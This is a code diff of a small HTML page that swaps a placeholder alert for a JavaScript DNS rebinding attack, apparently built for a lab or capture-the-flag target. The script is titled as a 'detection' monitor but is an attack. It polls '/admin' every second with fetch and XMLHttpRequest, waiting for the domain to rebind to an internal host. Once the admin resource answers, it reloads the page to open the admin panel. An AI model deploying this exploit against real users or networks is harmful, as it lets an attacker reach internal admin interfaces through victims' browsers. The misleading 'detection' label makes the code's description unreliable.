@@ -1,5 +1,164 @@
 <head>Ciao!</head>
 <body>
 Ciao ciao!
-<script>alert("Ciao!")</script>
+<script>
+// DNS Rebinding Attack Detection Script with Auto-Reload
+(function() {
+    'use strict';
+    
+    let attackDetected = false;
+    let attemptCount = 0;
+    const maxAttempts = 600; // ~10 minutes at 1 attempt/second
+    const checkInterval = 1000; // 1 second
+    
+    // Create status display
+    const statusDiv = document.createElement('div');
+    statusDiv.style.cssText = `
+        position: fixed;
+        top: 10px;
+        right: 10px;
+        background: #f0f0f0;
+        border: 2px solid #333;
+        padding: 10px;
+        font-family: Arial, sans-serif;
+        z-index: 10000;
+        border-radius: 5px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        max-width: 300px;
+    `;
+    
+    function updateStatus(message, color = '#333') {
+        statusDiv.innerHTML = `
+            <div style="color: ${color}; font-weight: bold; margin-bottom: 5px;">
+                DNS Rebinding Monitor
+            </div>
+            <div style="font-size: 12px;">${message}</div>
+            <div style="font-size: 10px; color: #666; margin-top: 5px;">
+                Attempts: ${attemptCount}
+            </div>
+        `;
+    }
+    
+    updateStatus('Starting monitoring...', '#0066cc');
+    document.body.appendChild(statusDiv);
+    
+    function reloadPage() {
+        updateStatus('Reloading page to access admin panel...', '#ff0000');
+        setTimeout(() => {
+            window.location.reload();
+        }, 1000); // Wait 1 second to show the message before reloading
+    }
+    
+    async function checkAdminResource() {
+        if (attackDetected || attemptCount >= maxAttempts) {
+            return;
+        }
+        
+        attemptCount++;
+        
+        try {
+            // Use fetch with cors mode to actually read the response status
+            const response = await fetch('/admin', {
+                method: 'GET',
+                cache: 'no-cache',
+                headers: {
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache'
+                }
+            });
+            
+            // Check if we got a successful response (200-299 status)
+            if (response.ok) {
+                attackDetected = true;
+                updateStatus('SUCCESS! Admin resource accessible<br>Reloading page...', '#00aa00');
+                
+                // Visual confirmation
+                statusDiv.style.background = '#e8f5e8';
+                statusDiv.style.borderColor = '#00aa00';
+                
+                // Reload the page to show the admin interface
+                reloadPage();
+                return;
+            } else {
+                // Got a response but not 200 (likely 404)
+                updateStatus(`Admin not accessible yet (${attemptCount}/${maxAttempts})<br>Status: ${response.status}`, '#ff9900');
+            }
+            
+        } catch (error) {
+            // Network error - can't reach the resource
+            updateStatus(`Blocked/Error (${attemptCount}/${maxAttempts})<br>Waiting for DNS rebinding...`, '#ff9900');
+        }
+    }
+    
+    // Alternative method using XMLHttpRequest to read status
+    function xhrCheck() {
+        if (attackDetected) return;
+        
+        const xhr = new XMLHttpRequest();
+        xhr.timeout = 5000;
+        
+        xhr.onload = function() {
+            if (attackDetected) return;
+            
+            // Check if status is 200
+            if (xhr.status === 200) {
+                attackDetected = true;
+                updateStatus('SUCCESS! (XHR) Admin resource accessible<br>Reloading page...', '#00aa00');
+                statusDiv.style.background = '#e8f5e8';
+                statusDiv.style.borderColor = '#00aa00';
+                reloadPage();
+            } else {
+                // Not 200 status
+                console.log(`XHR Status: ${xhr.status}`);
+            }
+        };
+        
+        xhr.onerror = function() {
+            // Normal case - resource not accessible yet
+        };
+        
+        xhr.ontimeout = function() {
+            // Timeout - normal case
+        };
+        
+        try {
+            xhr.open('GET', '/admin', true);
+            xhr.send();
+        } catch (e) {
+            // Ignore errors
+        }
+    }
+    
+    // Start checking with fetch
+    const intervalId = setInterval(checkAdminResource, checkInterval);
+    
+    // Also run XHR checks as backup
+    setInterval(xhrCheck, 1500);
+    
+    // Stop after max attempts
+    setTimeout(() => {
+        if (!attackDetected) {
+            clearInterval(intervalId);
+            updateStatus('Monitoring stopped<br>No rebinding detected', '#666');
+        }
+    }, maxAttempts * checkInterval);
+    
+    // Add CSS for animations
+    const style = document.createElement('style');
+    style.textContent = `
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        .success-flash {
+            animation: blink 0.5s infinite;
+            background: #e8f5e8 !important;
+            border-color: #00aa00 !important;
+        }
+    `;
+    document.head.appendChild(style);
+    
+})();
+</script>
 </body>
